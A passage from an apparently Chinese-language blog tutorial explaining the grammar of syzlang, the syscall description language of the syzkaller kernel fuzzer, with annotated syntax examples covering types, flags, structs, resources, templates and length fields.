我们已经讲了，现在我们来讲 type</p><p>type 的定义同样由两部分组成——<code>类型名（typename）</code> 与 <code>类型选项（type-options）</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type = typename [ &quot;[&quot; type-options &quot;]&quot; ]</span><br></pre></td></tr></table></figure><h4 id="类型名（typename）"><a href="#类型名（typename）" class="headerlink" title="类型名（typename）"></a>类型名（typename）</h4><p>即该 type 的类型，例如 C 当中的int、char、void 等等</p><p>常规选项包括：</p><ul><li><strong>opt</strong>：这是一个可选参数（例如 mmap 的 fd）</li></ul><p>其余 type-options 是基于特定 type 的，如下：</p><ul><li><p><strong>const</strong>：整型常数</p><ul><li>类型选项：<ul><li>值（value）：例如 <code>0</code></li><li>基础类型（underlying type）：<code>intN</code> 或 <code>intptr</code> 之一</li></ul></li></ul></li><li><p><strong>intN</strong> 或 <strong>intptr</strong>：一个有着特殊含义的整型，下文会进行详细说明</p><ul><li>类型选项：<ul><li>可选范围区间：例如 <code>&quot;1:100&quot;</code> 表示取值值的区间为 <code>[1, 100]</code></li><li>可选参数</li></ul></li></ul></li><li><p><strong>flags</strong>：值的集合</p><ul><li>类型选项：<ul><li>对 flags 描述的引用</li><li>基础整型类型：例如 <code>int32</code></li></ul></li></ul></li><li><p><strong>array</strong>：一个可变长&#x2F;固定长度的数组</p><ul><li>类型选项：<ul><li>元素的 type</li><li>可选长度区间：例如固定长度 <code>&quot;5&quot;</code> 或者长度范围 <code>&quot;5:10&quot;</code>（包括边界）</li></ul></li></ul></li><li><p><strong>ptr</strong> 或 <strong>ptr64</strong>：指向一个对象的指针</p><ul><li>类型选项：<ul><li>方向：<code>in</code> 或 <code>out</code> 或 <code>inout</code></li><li>对象的 type</li></ul></li><li>无论对象指针大小如何，ptr64 永远为 8 字节</li></ul></li><li><p><strong>string</strong>：一块有着 0 终止符的内存缓冲区</p><ul><li>类型选项：<ul><li>常量字符串&#x2F;对字符串的引用<ul><li>前者：例如 <code>&quot;foo&quot;</code>作为常规字符串进行解析，或者`deadbeef`作为4个 16 进制字节进行解析</li><li>后者：若是特殊类型 <code>filename</code> 则会<strong>生成</strong>文件名</li></ul></li></ul></li></ul></li><li><p><strong>stringnoz</strong>：一块<strong>没有</strong> 0 终止符的内存缓冲区</p><ul><li>类型选项：（同 <code>string</code>)</li></ul></li><li><p><strong>glob</strong>：匹配目标文件的 glob（？）模式</p><ul><li>类型选项：<ul><li>用引号包裹着的模式字符串：例如 <code>&quot;/sys/&quot;</code> 或 <code>&quot;/sys/**/*/&quot;</code>，具体用法参见<a href="https://pkg.go.dev/path/filepath#Match">https://pkg.go.dev/path/filepath#Match</a></li></ul></li></ul></li><li><p><strong>fmt</strong>：一个表示一个整数的字符串</p><ul><li>类型选项：<ul><li>格式与值：前者可取值为 <code>dec</code>或  <code>hex</code> 或 <code>oct</code>；后者可以是一个 resource、int、flags、const 或 proc</li></ul></li><li>最终的结果通常是固定尺寸的</li></ul></li><li><p><strong>len</strong>：另一个 <code> 字段</code> 的长度（对于 array 而言为元素的数量）</p><ul><li>类型选项：<ul><li>对象的 argname</li></ul></li></ul></li><li><p><strong>bytesize</strong>：与 len 类似，不过单位是<strong>字节</strong></p><ul><li>类型选项：<ul><li>对象的 argname</li></ul></li></ul></li><li><p><strong>bitsize</strong>：与 len 类型，不过单位是<strong>比特位</strong></p><ul><li>类型选项：<ul><li>对象的 argname</li></ul></li></ul></li><li><p><strong>offsetof</strong>：一个 <code>字段</code> 在其 parent struct  中的偏移（笔者怎么译都没那感觉，故保留原词）</p><ul><li>类型选项：<ul><li><code>字段</code></li></ul></li></ul></li><li><p><strong>vma</strong> 或 <strong>vma64</strong>：指向一组页的指针（用作 mmap&#x2F;munmap&#x2F;mremap&#x2F;madvise 的输入）</p><ul><li>类型选项：<ul><li>（可选）页的数量或页的范围：前者例如 <code>vma[7]</code>，后者例如 <code>vma[2-4]</code></li></ul></li><li>vma64 的长度恒为 8 字节</li></ul></li><li><p><strong>proc</strong>：单个进程的整型（详见下面的描述）</p><ul><li>类型选项：<ul><li>值的区间的起始</li><li>每个进程的值的数量</li><li>基础类型</li></ul></li></ul></li><li><p><strong>text</strong>：特定 type 的机器码</p><ul><li>类型选项：<ul><li>代码类型：<code>x86_real</code>, <code>x86_16</code>, <code>x86_32</code>, <code>x86_64</code>, <code>arm64</code></li></ul></li></ul></li><li><p><strong>void</strong>：type with static size 0（自己体会，怎么译都没那种感觉…）</p><ul><li>通常在模板以及可变长（varlen）联合体中使用，<strong>不能用作系统调用的参数</strong></li></ul></li></ul><p>在 <code>结构体/联合体/指针</code> 中使用时，<code>flags/len/flags</code> 的构成中尾部还可以跟着 type type-options</p><blockquote><p><del>唉呀你说了这么多谁听得懂啊，还是快把🌰搬上来吧</del></p></blockquote><h5 id="关于-flags-的补充说明"><a href="#关于-flags-的补充说明" class="headerlink" title="关于 flags 的补充说明"></a>关于 <em>flags</em> 的补充说明</h5><p>flags 通常具有如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagname = const [&quot;,&quot; const]*</span><br></pre></td></tr></table></figure><p>这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_flags = 1,2,3,4,5,6,7,8,9,0</span><br></pre></td></tr></table></figure><p>对于 string 类型的 flag，其应当具有如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagname = &quot;\&quot;&quot; literal &quot;\&quot;&quot; [&quot;,&quot; &quot;\&quot;&quot; literal &quot;\&quot;&quot;]*</span><br></pre></td></tr></table></figure><p>这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_str_flags = &quot;arttnba3&quot;, &quot;arttnba4&quot;, &quot;arttnba5&quot;</span><br></pre></td></tr></table></figure><h4 id="类型选项（type-options）"><a href="#类型选项（type-options）" class="headerlink" title="类型选项（type-options）"></a>类型选项（type-options）</h4><blockquote><p>在类型当中，类型选项其实也是可选项（<del>又搁这绕口令了</del>）</p></blockquote><p>type-options 在笔者的理解中为<strong>对一个特定 type 的补充说明</strong>，其应当具有如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type-options = [type-opt [&quot;,&quot; type-opt]]</span><br></pre></td></tr></table></figure><p>我们不难看出 type-options 在 syzlang 中为<strong>可选项</strong>，同样地，对于一个 type 其可以有多个 type-options</p><p>查看前面 type 的形式说明可知，在使用类型选项时，我们应当使用 <code>[]</code> 将之包裹</p><p>以下是一个简单的🌰（作为系统调用参数输入，而非单独的参数定义）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flags flags[open_flags]</span><br></pre></td></tr></table></figure><p>从左向右解析：对于这个系统调用的 <code>flags</code> 参数，我们的输入是一个 flags 类型，其类型选项为对一个 flags 描述 <code>open_flags</code> 的引用，意为取值为 open_flags 中之一</p><p>其中 open_flags 被定义如下，这些值通过 include 语句从内核源文件中被包含进来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br></pre></td></tr></table></figure><h3 id="III-系统调用模板"><a href="#III-系统调用模板" class="headerlink" title="III.系统调用模板"></a>III.系统调用模板</h3><p>我们将上面的结果进行整合，一个系统调用的形式应当如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscallname &quot;(&quot; [arg [&quot;,&quot; arg]*] &quot;)&quot; [type] [&quot;(&quot; attribute* &quot;)&quot;]</span><br></pre></td></tr></table></figure><p>接下来笔者通过一个🌰进行分解说明</p><h4 id="基本形式"><a href="#基本形式" class="headerlink" title="基本形式"></a>基本形式</h4><p>我们将其最小化，我们应当书写为如下形式，类似于常规的 C 语言函数调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscallname(arg)</span><br></pre></td></tr></table></figure><p>例如对于 open 这个系统调用，我们可以写成这个样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode])</span><br><span class="line">#...</span><br><span class="line">open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br><span class="line">open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure><p>对于 open 系统调用的三个参数，我们给了这样的输入：</p><ul><li>file 参数：一个<strong>指针</strong>类型，其 type-opetions 的第一个为 <code>in</code>，意为由该指针指向特定对象，第二个为 <code>filename</code>，为<strong>特殊的 string 对象</strong>，对于 filename，syzlang 会进行文件生成，将文件名作为输入</li><li>flags 参数：一个 <strong>flags</strong> 类型，其 type-options 为 <code>open_flags</code> ，意为从我们定义的 flags——<code>open_flags</code> 中取值</li><li>mode 参数：一个 <strong>flags</strong> 类型，其 type-options 为 <code>open_mode</code> ，意为从我们定义的 flags——<code>open_mode</code> 中取值</li></ul><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>接下来我们再继续深入，系统调用通常都有返回值，我们可以选择接收也可以选择忽视，若是我们需要进行接收，则应当在系统调用的末尾添加 type ，例如 open 这个系统调用会返回一个文件描述符，我们现在想将其返回的文件描述符存到一个变量比如说 <code>a3fd</code>（假如已被声明为 _资源_（下文解释）） 当中，我们应当写成下面这个形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode]) a3fd</span><br></pre></td></tr></table></figure><p>那么 open 的返回值便被存储到了 <code>a3fd</code> 这一个 type 当中，我们在后续便可以将 fd 用作其他系统调用的参数，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">close(fd a3fd)</span><br></pre></td></tr></table></figure><h4 id="call-attributes"><a href="#call-attributes" class="headerlink" title="call attributes"></a>call attributes</h4><p>系统调用模板当中还有一个可选项是 <code>attributes</code>，即这一个系统调用的<strong>属性</strong>，可以取的值如下：</p><ul><li><code>disabled</code>：该系统调用将不用于 fuzzing；这个属性通常用于临时禁用某些系统调用，或者禁用特定的参数组合</li><li><code>timeout[N]</code>：系统调用在默认值以外的额外的超时时间，单位为毫秒（ms）</li><li><code>prog_timeoout[N]</code>：若一个程序包含了该系统调用，则该属性为整个程序的执行的超时时间，若存在多个定义了该属性的系统调用则取最大值</li><li><code>ignore_return</code>：在回退反馈（笔者推指的是 syzkaller 的 fuzz 机制之一，根据返回值判断路径覆盖之类的）中忽视这个系统调用的返回值；用于不返回固定的错误码（例如 -EFAULT）而是返回其他值的系统调用</li><li><code>break_returns</code>：忽略回退反馈中程序中所有后续系统调用的返回值（文档中说 <code>can&#39;t be trusted</code>，笔者暂时不理解…）</li></ul><h4 id="变种（variants）"><a href="#变种（variants）" class="headerlink" title="变种（variants）"></a>变种（variants）</h4><p>对于系统调用的变种形式，我们应当在系统调用名后面使用 <code>$</code> 符号进行额外的指定</p><p>下面是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open$dir(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode]) fd_dir</span><br></pre></td></tr></table></figure><blockquote><p>按笔者的理解应该是为其取一个别名？比如说对于 syzkaller 而言 <code>open$dir</code> 和 <code>open$a3dir</code> 就是两个东西，而若是在两个不同的文件中都出现了 <code>open$dir</code> 则会在_重编译_（下文解释）时发生冲突</p></blockquote><h3 id="IV-整型（integer）"><a href="#IV-整型（integer）" class="headerlink" title="IV.整型（integer）"></a>IV.整型（integer）</h3><p>整型也是一种 type，其可选项为 <code>int8</code> 、<code>int16</code>、<code>int32</code>、<code>int64</code>，表示相应大小的整型</p><p><code>intptr</code> 用以表示一个<strong>指针大小</strong>的整型，对应 C 语言中的 <code>long</code></p><p>通过添加 <code>be</code> 后缀表示这个整型存储为<strong>大端序</strong></p><p>这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read$eventfd(fd fd_event, val ptr[out, int64], len len[val])</span><br></pre></td></tr></table></figure><p>我们可以用这样的形式来指定 int 的范围：<code>int32[0:100]</code>——意为该整型的取值范围为 <code>[0,100]</code></p><p>我们还可以额外指定取值的跨度，例如 <code>int32[1:10, 2]</code> 意为其取值为 {1, 3, 5, 7, 9}</p><p>我们还可以额外指定一个整型的取值范围，单位为比特位，例如 <code>int64:20</code> 意为这个整型只取其 20 bit 的值进行随机化</p><h3 id="V-结构体、联合体与其成员（字段）"><a href="#V-结构体、联合体与其成员（字段）" class="headerlink" title="V.结构体、联合体与其成员（字段）"></a>V.结构体、联合体与其成员（字段）</h3><p>在 syzlang 中同样可以定义结构体&#x2F;联合体，结构体&#x2F;联合体的成员被称之为 <code>字段</code>（field）</p><h4 id="结构体（struct）"><a href="#结构体（struct）" class="headerlink" title="结构体（struct）"></a>结构体（struct）</h4><p>在 syzlang 中，一个结构体应为如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">structname &quot;&#123;&quot; &quot;\n&quot;</span><br><span class="line">(fieldname type (&quot;(&quot; fieldattribute* &quot;)&quot;)? &quot;\n&quot;)+</span><br><span class="line">&quot;&#125;&quot; (&quot;[&quot; attribute* &quot;]&quot;)?</span><br></pre></td></tr></table></figure><p>对于字段而言，其可以在后面的 <code>()</code> 中指定字段属性，但与 type 的属性不同，唯一的属性只有方向： <code>in/out/inout</code>，对于指定的字段，其方向属性会被上层属性给覆盖</p><p>在结构体定义的尾部，我们可以额外指定一些属性（使用 <code>[]</code> 包裹），可选属性有：</p><ul><li><code>packed</code>：该结构体不同字段之间没有 padding（例如 C 中有一个结构体 <code>struct T&#123;int a; char b;&#125;;</code>，char 为 1 字节，int 为 4 字节，那么该结构体便会对 4 字节对齐，在其两个字段之间就会有 3 字节的 padding）</li><li><code>align[N]</code>：指定该结构体对 N 字节对齐，padding 的内容并未指定（通常为0）</li><li><code>size[N]</code>：结构体被填充到指定的大小 <code>N</code></li></ul><p>其实和我们在 C 语言中写结构体差不多，下面是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">my_struct &#123;</span><br><span class="line">a3f1 int8# 一个随机的 1 字节的 int</span><br><span class="line">a3f2const[0xdeadbeef, int32be]# 一个固定的 8 字节的 int，取值为 0xdeadbeef，大端序</span><br><span class="line">a3f3int32[0:100]# 一个随机的 4 字节的 int，取值范围为 [0,100]</span><br><span class="line">a3f4int64:20# 一个随机的 8 字节的 int，只取20个比特的值（其他bit置0？）</span><br><span class="line">&#125; [packed]</span><br></pre></td></tr></table></figure><h4 id="联合体（union）"><a href="#联合体（union）" class="headerlink" title="联合体（union）"></a>联合体（union）</h4><p>与结构体基本相同，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unionname &quot;[&quot; &quot;\n&quot;</span><br><span class="line">(fieldname type (&quot;(&quot; fieldattribute* &quot;)&quot;)? &quot;\n&quot;)+</span><br><span class="line">&quot;]&quot; (&quot;[&quot; attribute* &quot;]&quot;)?</span><br></pre></td></tr></table></figure><p>不同的是其属性的可选项，有：</p><ul><li><code>varlen</code>：联合体的大小可变（为指定的字段的长度），若未指定则该联合体大小为其最大字段的大小（类型 C 语言）</li><li><code>size[N]</code>：该联合体被填充到指定的大小 <code>N</code></li></ul><h3 id="VI-资源（resources）"><a href="#VI-资源（resources）" class="headerlink" title="VI.资源（resources）"></a>VI.资源（resources）</h3><p>资源（resources）用作那些需要作为一个系统调用的输出的值传递给另一个系统调用做输入的值。</p><p>这么说可能有些空泛，笔者来举个🌰， <code>close</code> 系统调用接收一个文件描述符作为参数，而这个文件描述符应当为你在之前进行 <code>open </code> 或 <code>pipe</code> 系统调用时获得的返回值，为了达成这个目的，我们需要将文件描述符（比如说叫 <code>fd</code>）声明为一个<strong>资源</strong></p><p>resources 的形式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;resource&quot; identifier &quot;[&quot; underlying_type &quot;]&quot; [ &quot;:&quot; const (&quot;,&quot; const)* ]</span><br></pre></td></tr></table></figure><p>其中的 <code>underlying_type</code> 可以是 <code>int8</code>, <code>int16</code>, <code>int32</code>, <code>int64</code>, <code>intptr</code> 或者是另一个资源（可以是其子类，比如说一个 socket 便是 文件描述符的“子类”）</p><p>常量集合可以作为可选参数，表示该资源的特殊值（比如说 0xdeadbeef），特殊值偶尔被用作资源的值，若未指定特殊值，则会使用特殊值 <code>0</code></p><p>资源也可以被用作类型（types），这是官方给出的一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">resource fd[int32]: 0xffffffffffffffff, AT_FDCWD, 1000000</span><br><span class="line">resource sock[fd]# 继承 fd 类型</span><br><span class="line">resource sock_unix[sock]# 继承 sock 类型</span><br><span class="line"></span><br><span class="line">socket(...) sock</span><br><span class="line">accept(fd sock, ...) sock</span><br><span class="line">listen(fd sock, backlog int32)</span><br></pre></td></tr></table></figure><p>资源<strong>并不一定要是系统调用的返回值</strong>，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">resource my_resource[int32]</span><br><span class="line"></span><br><span class="line">request_producer(..., arg ptr[out, my_resource])</span><br><span class="line">request_consumer(..., arg ptr[inout, test_struct])</span><br><span class="line"></span><br><span class="line">test_struct &#123;</span><br><span class="line">...</span><br><span class="line">attrmy_resource</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于更为复杂的生产者&#x2F;消费者场景，字段属性也可以被利用，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">resource my_resource_1[int32]</span><br><span class="line">resource my_resource_2[int32]</span><br><span class="line"></span><br><span class="line">request_produce1_consume2(..., arg ptr[inout, test_struct])</span><br><span class="line"></span><br><span class="line">test_struct &#123;</span><br><span class="line">...</span><br><span class="line">field0my_resource_1(out)</span><br><span class="line">field1my_resource_2(in)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="VII-类型别名（Type-Alias）"><a href="#VII-类型别名（Type-Alias）" class="headerlink" title="VII.类型别名（Type Alias）"></a>VII.类型别名（Type Alias）</h3><p>笔者认为可以理解为 C 中的一种特殊的 typedef，其格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type identifier underlying_type</span><br></pre></td></tr></table></figure><p>这么看可能有些空泛，我们来看一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type bool8int8[0:1]</span><br><span class="line">type bool16int16[0:1]</span><br><span class="line">type bool32int32[0:1]</span><br><span class="line">type bool64int64[0:1]</span><br><span class="line">type boolptrintptr[0:1]</span><br><span class="line"></span><br><span class="line">type fileoff[BASE] BASE</span><br><span class="line"></span><br><span class="line">type filename string[filename]</span><br><span class="line"></span><br><span class="line">type buffer[DIR] ptr[DIR, array[int8]]</span><br></pre></td></tr></table></figure><p>在这个例子当中我们需要使用布尔值，其取值只有 0 或 1 ，所以我们需要写成 <code>intN[0:1]</code>，但是若是在每一个需要用到布尔值的地方都这么写就太麻烦了，也不利于理解，这个时候就可以给他定义一个<strong>类型别名</strong> <code>boolN</code>，简单易懂</p><h3 id="VIII-类型模板（Type-Template）"><a href="#VIII-类型模板（Type-Template）" class="headerlink" title="VIII.类型模板（Type Template）"></a>VIII.类型模板（Type Template）</h3><p>类型模板应定义为如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type optional[T] [</span><br><span class="line">valT</span><br><span class="line">voidvoid</span><br><span class="line">] [varlen]</span><br></pre></td></tr></table></figure><p><del>唉呀谷歌你这么讲谁能够看得懂啊，还是赶紧把🌰给掏出来吧</del></p><p>下面是一个简单的用法🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type buffer[DIR] ptr[DIR, array[int8]]</span><br><span class="line">type fileoff[BASE] BASE</span><br><span class="line">type nlattr[TYPE, PAYLOAD] &#123;</span><br><span class="line">nla_lenlen[parent, int16]</span><br><span class="line">nla_typeconst[TYPE, int16]</span><br><span class="line">payloadPAYLOAD</span><br><span class="line">&#125; [align_4]</span><br><span class="line"></span><br><span class="line">#...</span><br><span class="line"></span><br><span class="line">syscall(a buffer[in], b fileoff[int64], c ptr[in, nlattr[FOO, int32]])</span><br></pre></td></tr></table></figure><p><del>笔者也没看明白，暂时就先不误人子弟了</del></p><h3 id="IX-长度（length）"><a href="#IX-长度（length）" class="headerlink" title="IX.长度（length）"></a>IX.长度（length）</h3><p>你可以使用关键字 <code>len</code>、<code>bytesize</code>、<code>bitsize</code> 来指定结构体当中特定字段的长度</p><p>若是 <code>len</code> 的参数为一个指针，则其取值为<strong>指针所指对象的大小</strong></p><p>若要表示一个 <code>N 字节的字</code> 中字段的长度，则应当使用 <code>bytesizeN</code>，其中 N 的取值可以为 1、2、4、8</p><h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a><em>example</em></h4><p>这是谷歌官方给出的一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">write(fd fd, buf ptr[in, array[int8]], count len[buf])</span><br><span class="line"></span><br><span class="line">sock_fprog &#123;</span><br><span class="line">lenlen[filter, int16]</span><br><span class="line">filterptr[in, array[sock_filter]]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 write 系统调用当中，我们给其 count 参数传入了一个特殊的参数 <code>len[buf]</code>，表示此处传入的值为参数 buf 的长度</p><p>在 sock_fprog 这个结构体当中，我们给其字段 len 设置的值为其 filter 字段的长度，类型为 int 16</p><p>若要表示父类的长度，可以使用 <code>len[parent, intN]</code>，若要在结构体互相嵌入时表示更顶层的父类的长度，可以指定特定父类的类型名称，下面是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s1 &#123;</span><br><span class="line">    f0      len[s2]  # length of s2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s2 &#123;</span><br><span class="line">    f0      s1</span><br><span class="line">    f1      array[int32]</span><br><span class="line">    f2      len[parent, int32]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>len 也支持更加复杂的路径寻址，比如说如果你闲着没事干你可以写成谷歌给出的这个🌰里的样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">s1 &#123;</span><br><span class="line">aptr[in, s2]</span><br><span class="line">bptr[in, s3]</span><br><span class="line">carray[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s2 &#123;</span><br><span class="line">darray[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s3 &#123;</span><br><span class="line"># This refers to the array c in the parent s1.</span><br><span class="line">elen[s1:c, int32]</span><br><span class="line"># This refers to the array d in the sibling s2.</span><br><span class="line">flen[s1:a:d, int32]</span><br><span class="line"># This refers to the array k in the child s4.</span><br><span class="line">glen[i:j, int32]</span><br><span class="line"># This refers to syscall argument l.</span><br><span class="line">hlen[syscall:l, int32]</span><br><span class="line">iptr[in, s4]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s4 &#123;</span><br><span class="line">jarray[int8]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(k ptr[in, s1], l ptr[in, array[int8]])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="X-进程（proc）"><a href="#X-进程（proc）" class="headerlink" title="X.进程（proc）"></a>X.进程（proc）</h3><p>进程 <code>proc</code> 类型可以用于表示分进程整型值，即为每一个执行程序设置一个单独的值的范围，这样他们之间就不会互相干扰，🌰如端口号就不能够被共享，而是需要每个进程有一个自己的端口</p><p>这里举一个简单的🌰， <code>proc[20000, 4, int16be]</code> 表示为每个进程生成一个大端序的 int16 的值，为每个进程分配其中的 4 个值，从 20000 开始分配，比如说第 N 个 executor 分配到的值范围便是 <code>[20000 + n * 4, 20000 + (n + 1) * 4)</code></p><h3 id="XI-整型常量（Integer-Constants）"><a href="#XI-整型常量（Integer-Constants）" class="headerlink" title="XI.整型常量（Integer Constants）"></a>XI.整型常量（Integer Constants）</h3><p>整型常量可以指定为十进制、<code>0x</code> 开头的十六进制、用单引号 <code>&#39;</code> 包裹的字符，或者从内核头文件中提取出来的由 <code>define</code> 定义的常量（比如说 <code>O_RDONLY</code>）</p><p>这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foo(a const[10], b const[-10])</span><br><span class="line">foo(a const[0xabcd])</span><br><span class="line">foo(a int8[&#x27;a&#x27;:&#x27;z&#x27;])</span><br><span class="line">foo(a const[PATH_MAX])</span><br><span class="line">foo(a ptr[in, array[int8, MY_PATH_MAX]])</span><br><span class="line">define MY_PATH_MAXPATH_MAX + 2</span><br></pre></td></tr></table></figure><h3 id="XII-杂项（Misc）"><a href="#XII-杂项（Misc）" class="headerlink" title="XII.杂项（Misc）"></a>XII.杂项（Misc）</h3><p>描述文件还包括用以进行内核头文件包含的 <code>include</code> 指令，用以包含内核头文件目录的 <code>incdir</code> 指令，以及用以设置常量的 <code>define</code> 指令</p><p>syzkaller executor 还定义了一些 <a href="https://github.com/google/syzkaller/blob/master/docs/pseudo_syscalls.md">pseudo system calls</a> ，我们可以在描述文件中使用这些伪系统调用。这些伪系统调用被扩展为 C 代码，可以执行用户自定义的一些操作，<a href="https://github.com/google/syzkaller/blob/master/executor/common_linux.h">这里</a>是一些🌰</p><p>要写出优秀的描述文件，<a 